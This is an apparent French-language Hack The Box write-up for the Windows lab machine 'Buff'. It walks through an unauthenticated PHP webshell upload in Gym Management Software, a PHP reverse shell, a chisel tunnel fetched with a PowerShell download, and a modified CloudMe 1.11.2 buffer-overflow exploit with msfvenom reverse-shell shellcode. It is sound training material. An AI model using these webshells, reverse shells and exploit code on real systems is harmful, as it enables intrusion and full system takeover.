# Buff

> **Statut** : [ ] Non commencé | [ ] En cours | [x] Root  
> **OS** : Windows  
> **Difficulté** : Easy  
> **HTB** : https://app.hackthebox.com/machines/263  
> **Difficulté ressentie** : 6/10  
> **IP** : 10.129.4.4  

---

## Reconnaissance

### Nmap

```bash
sudo nmap 10.129.4.4
```

| Port | State | Service |
|------|-------|---------|
| 8080/tcp | open | http-proxy |

Un seul port ouvert - un serveur web sur le port 8080.

### Énumération

**Feroxbuster - scan des répertoires :**

```bash
feroxbuster -u http://10.129.4.4:8080 -w raft-medium-directories.txt -s 200,301,302
```

Repertoires intéressants découverts :
- `/include/` - fichiers PHP inclus
- `/upload/` - répertoire d'upload
- `/profile/` - profils utilisateurs (parse error PHP)
- `/ex/` - erreur DB `secure_login` inexistante
- `/ex/admin/` - 403 Forbidden

**Feroxbuster - scan des fichiers PHP :**

```bash
feroxbuster -u http://10.129.4.4:8080 -w raft-medium-files.txt -s 200,301,302 -x php --no-reçursion
```

Fichiers PHP intéressants :
- `index.php` - page d'accueil (Gym Management Software 1.0)
- `register.php` - "Only admin allowed"
- `upload.php` - endpoint d'upload
- `up.php` - second endpoint d'upload (notices PHP : `Undefined index: name, ext`)
- `edit.php` / `editp.php` - édition de profil
- `contact.php` / `feedback.php`

**Stack identifiée :** Windows (XAMPP), PHP 7.4.6, Apache 2.4.43, MySQL

**Observations :**
- `/ex/` → `Warning: mysqli::__construct(): (HY000/1049): Unknown database 'secure_login'` dans `C:\xampp\htdocs\gym\ex\include\db_connect.php` - révèle le chemin absolu sur le serveur
- `/register.php` → 403 "Only admin allowed"
- `up.php` → les notices PHP `Undefined index: name` et `Undefined index: ext` révèlent les paramètres attendus par le script

---

## Exploitation

### Vecteur d'attaque

Upload de webshell PHP via `up.php` - le endpoint accepte un fichier sans aucune validation d'extension ni d'authentification.

### Exploitation

**1. Découverte du endpoint d'upload (`up.php`) :**

En accédant à `up.php` sans paramètre, PHP affiche des notices d'erreur qui révèlent les noms des paramètres attendus :

```bash
curl -s http://10.129.4.4:8080/up.php
# → Notice: Undefined index: name in C:\xampp\htdocs\gym\up.php on line 2
# → Notice: Undefined index: ext in C:\xampp\htdocs\gym\up.php on line 3
```

Le script attend donc trois paramètres : `image` (le fichier), `name` (le nom) et `ext` (l'extension).

**2. Test d'upload - identification du champ file :**

Premier test pour trouver le nom du champ fichier. On essaie `image` (nom courant pour un upload) :

```bash
curl -v http://10.129.4.4:8080/up.php \
  -F "image=@-;filename=test.php" <<< '<?php system($_GET["cmd"]); ?>'
# → Erreur move_uploaded_file() vers . → le fichier est accepté mais name/ext manquants
```

Syntaxe curl expliquée :
- `-F "image=@-;filename=test.php"` : envoie un fichier en multipart. `@` indique à curl d'envoyer un fichier (pas du texte), `-` signifie "lire depuis stdin", et `;filename=test.php` force le nom du fichier dans la requête HTTP
- `<<< '<?php system(...); ?>'` : here-string bash, injecte le contenu du webshell dans stdin de curl
- Équivalent à créer un fichier puis faire `curl -F "image=@test.php"`, mais en une seule commande

L'erreur `move_uploaded_file()` confirme que le champ `image` est correct. Le fichier est reçu mais le chemin de destination est incomplet car `name` et `ext` ne sont pas fournis.

**3. Upload du webshell avec tous les paramètres :**

```bash
curl -v http://10.129.4.4:8080/up.php \
  -F "image=@-;filename=test.php" \
  -F "name=test" \
  -F "ext=php" <<< '<?php system($_GET["cmd"]); ?>'
# → HTTP 200, Content-Length: 0, aucune erreur
```

On ajoute les deux paramètres manquants (`name` et `ext`). Le serveur construit le chemin de destination avec ces valeurs, ce qui permet au `move_uploaded_file()` de réussir. Le webshell est maintenant accessible à la racine du site.

**4. RCE confirmée :**

```bash
curl -s "http://10.129.4.4:8080/test.php?cmd=whoami"
# → buff\shaun
```

On a une exécution de commande en tant que `buff\shaun`.

**5. Énumération rapide via le webshell :**

Avant de passer à un vrai reverse shell, on peut énumérer directement via curl :

```bash
# Privilèges de l'utilisateur
curl -s 'http://10.129.4.4:8080/test.php?cmd=whoami+/priv'

# Utilisateurs locaux
curl -s 'http://10.129.4.4:8080/test.php?cmd=net+user'

# Processus en cours
curl -s 'http://10.129.4.4:8080/test.php?cmd=tasklist'

# Ports en écoute
curl -s 'http://10.129.4.4:8080/test.php?cmd=netstat+-ano'

# Infos système
curl -s 'http://10.129.4.4:8080/test.php?cmd=systeminfo'
```

**6. Reverse shell - upload et déclenchement :**

Le webshell curl est fonctionnel mais peu pratique (pas interactif, pas de persistance). On uploade un vrai reverse shell PHP (Ivan Sincek, généré via revshells.com) :

```bash
# Upload du reverse shell PHP (IP et port configurés dans le fichier)
curl -v http://10.129.4.4:8080/up.php \
  -F "image=@rshell.php;filename=rshell.php" \
  -F "name=rshell" \
  -F "ext=php"
```

Note : ici on utilise `@rshell.php` (lecture depuis un fichier sur disque) au lieu de `@-` + `<<<` (lecture depuis stdin) comme pour le webshell. Le webshell tenait en une ligne, donc on pouvait le passer inline. Le reverse shell Ivan Sincek fait ~180 lignes, il a été créé au préalable avec `vim rshell.php`.

```bash
# Terminal 1 - lancer le listener
nc -lvn 4444

# Terminal 2 - déclencher le reverse shell
curl -s http://10.129.4.4:8080/rshell.php
```

Résultat :

```
SOCKET: Shell has connected! PID: 8336
Microsoft Windows [Version 10.0.17134.1610]
C:\xampp\htdocs\gym>
```

---

## Privilege Escalation

### Énumération locale

Depuis le reverse shell, on énumère le système pour trouver un vecteur de privesc.

**systeminfo :**

```bash
systeminfo
```

| Info | Valeur |
|------|--------|
| OS | Windows 10 Enterprise Build 17134 |
| Architecture | x64 |
| Hostname | BUFF |
| Owner | shaun |
| Domain | WORKGROUP |
| Hotfixes | N/A |

**whoami /priv :**

```
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

Pas de privilèges exploitables (pas de SeImpersonate, pas de SeDebug).

**net user :** Administrator, DefaultAccount, Guest, shaun, WDAGUtilityAccount

**Processus intéressants (tasklist) :**

```bash
tasklist
```

| Processus | PID | Note |
|-----------|-----|------|
| CloudMe.exe | 1872 | Logiciel de synchronisation cloud |
| httpd.exe | 8272 | Apache (port 8080) |
| mysqld.exe | 8308 | MySQL (port 3306 localhost) |
| MsMpEng.exe | 2916 | Windows Defender actif |

`CloudMe.exe` est un logiciel tiers qui tourne - à investiguer.

**Ports internes (netstat -ano) :**

```bash
netstat -ano
```

| Port | Service | Note |
|------|---------|------|
| 3306 | MySQL | localhost uniquement (PID 8308) |
| 8888 | CloudMe | localhost uniquement (PID 1872) |
| 8080 | Apache | exposé (PID 8272) |

Le port 8888 est crucial : CloudMe écoute en local uniquement, il n'est pas accessible depuis l'extérieur.

**Confirmation de la version CloudMe :**

```bash
dir C:\Users\shaun\Downloads
```

```
22/02/2026  19:51         9,760,768 chisel.exe
16/06/2020  15:26        17,830,824 CloudMe_1112.exe
```

L'installeur `CloudMe_1112.exe` confirme la version **1.11.2** - cette version est vulnérable a un buffer overflow connu (EDB-48389).

### Escalade

**Vecteur :** CloudMe 1.11.2 - buffer overflow (EDB-48389).

Le principe : CloudMe écoute sur le port 8888 en local. L'exploit envoie un buffer surdimensionné qui écrase l'adresse de retour (EIP) et redirigé l'exécution vers un shellcode (reverse shell). Comme le service tourne avec des privilèges élevés, on obtient un shell administrator.

Le problème : le port 8888 n'est accessible qu'en localhost sur la box. Il faut donc un tunnel pour l'atteindre depuis la machine d'attaque.

**1. Transfert de chisel sur la box :**

Chisel est un outil de tunneling TCP sur HTTP. Il faut transférer le binaire Windows sur la box.

```bash
# Sur la machine d'attaque - télécharger chisel pour macOS et Windows
curl -L -o /tmp/chisel_mac.gz https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_darwin_arm64.gz
curl -L -o /tmp/chisel_win.gz https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_windows_amd64.gz
gunzip /tmp/chisel_mac.gz && chmod +x /tmp/chisel_mac
gunzip /tmp/chisel_win.gz && mv /tmp/chisel_win /tmp/chisel.exe
```

```bash
# Sur la machine d'attaque - servir chisel.exe via HTTP
cd /tmp && python3 -m http.server 8000
```

```bash
# Sur la box - télécharger chisel.exe
# certutil est bloqué → on passe par PowerShell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.14.182:8000/chisel.exe','C:\Users\shaun\Downloads\chisel.exe')"
```

Note : `certutil -urlcache` retournait "Access is denied" - Windows Defender ou une restriction bloquait certutil. PowerShell `WebClient` a fonctionné comme alternative.

**2. Mise en place du tunnel chisel :**

```bash
# Terminal 1 - machine d'attaque : lancer le serveur chisel en mode reverse
/tmp/chisel_mac server --reverse -p 9999
```

```bash
# Sur la box : connecter le client chisel
C:\Users\shaun\Downloads\chisel.exe client 10.10.14.182:9999 R:8888:127.0.0.1:8888
```

Ce tunnel fait en sorte que le `localhost:8888` de la machine d'attaque soit redirigé vers `127.0.0.1:8888` sur la box. CloudMe est désormais accessible depuis la machine d'attaque.

Schéma du tunnel :

```
Machine d'attaque :8888 ──── chisel tunnel ──→ Box 127.0.0.1:8888 (CloudMe)
```

**3. Génération du payload msfvenom :**

L'exploit original (EDB-48389) lance `calc.exe`. Il faut remplacer le shellcode par un reverse shell :

```bash
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.182 LPORT=5555 -b '\x00\x0A\x0D' -f python -v payload
```

Paramètres :
- `-a x86` : architecture 32 bits (CloudMe est un binaire x86)
- `-p windows/shell_reverse_tcp` : payload reverse shell TCP
- `-b '\x00\x0A\x0D'` : bad characters a éviter (null byte, line feed, carriage return)
- `-f python` : format de sortie Python (pour coller dans le script)
- `-v payload` : nom de la variable

**4. Modification de l'exploit :**

On prend le script de EDB-48389 et on remplace le shellcode `calc.exe` par celui généré par msfvenom :

```python
import socket

target = "127.0.0.1"

padding1   = b"\x90" * 1052
EIP        = b"\xB5\x42\xA8\x68"  # 0x68A842B5 -> PUSH ESP, RET (gadget ROP)
NOPS       = b"\x90" * 30

# msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.182 LPORT=5555 -b '\x00\x0A\x0D' -f python -v payload
payload =  b""
payload += b"\xdb\xc8\xd9\x74\x24\xf4\xbd\x03\xe3\x5a\x1e..."  # (shellcode complet)

overrun = b"C" * (1500 - len(padding1 + NOPS + EIP + payload))
buf = padding1 + EIP + NOPS + payload + overrun

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, 8888))
    s.send(buf)
except Exception as e:
    print(e)
```

Structure du buffer :
- `padding1` (1052 octets de NOP) : remplit le buffer jusqu'à l'adresse de retour
- `EIP` : écrase l'adresse de retour avec un gadget `PUSH ESP; RET` qui redirige vers le shellcode
- `NOPS` (30 octets) : NOP sled pour atterrir proprement dans le shellcode
- `payload` : le shellcode reverse shell généré par msfvenom
- `overrun` : padding pour atteindre la taille totale de 1500 octets

**5. Exécution de l'exploit :**

```bash
# Terminal 1 - listener pour le shell administrator
nc -lvn 5555

# Terminal 2 - chisel server (déjà en cours)
/tmp/chisel_mac server --reverse -p 9999

# Terminal 3 - lancer l'exploit (le tunnel chisel redirigé vers la box)
python3 cloudme_exploit.py
```

**6. Shell administrator obtenu :**

```
C:\Windows\system32>whoami
buff\administrator
```

```
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
3940c94a************************
```

---

## Flags

- **User** : `9006ac5d************************`
- **Root** : `3940c94a************************`

---

## Leçons apprises

- **Erreurs PHP comme source d'info** : les notices `Undefined index` révèlent les paramètres attendus par un script. Toujours tester un endpoint avec des requêtes vides/partielles pour provoquer des erreurs
- **Upload sans validation** : `up.php` accepte n'importe quelle extension, pas d'auth requise. Un seul endpoint mal sécurisé suffit pour obtenir une RCE
- **Énumération des processus et ports** : toujours checker `tasklist` et `netstat -ano` pour trouver des services internes non exposés. Ici CloudMe sur localhost:8888 était invisible depuis l'extérieur
- **Alternatives de transfert de fichiers** : quand `certutil` est bloqué, passer par PowerShell `WebClient` ou `Invoke-WebRequest`. Avoir plusieurs méthodes de transfert en tête
- **Chisel pour le port forwarding** : indispensable quand un service vulnérable n'écoute qu'en local. Le mode `--reverse` permet au client (sur la box) de se connecter au serveur (chez nous), contournant le firewall
- **Buffer overflow CloudMe** : exploit classique EDB-48389, il suffit de remplacer le shellcode par un payload msfvenom adapté. Toujours vérifier l'architecture du binaire cible (`-a x86`)

---

## Ressources

- [RevShells - générateur de reverse shells](https://www.revshells.com)
- [EDB-48389 - CloudMe 1.11.2 buffer overflow](https://www.exploit-db.com/exploits/48389)
- [EDB-48506 - Gym Management System 1.0 - Unauthenticated RCE via file upload](https://www.exploit-db.com/exploits/48506)
- [Chisel - tunnel TCP/UDP sur HTTP](https://github.com/jpillora/chisel)
- [msfvenom - référence payloads](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/reverse-shells/msfvenom.html)
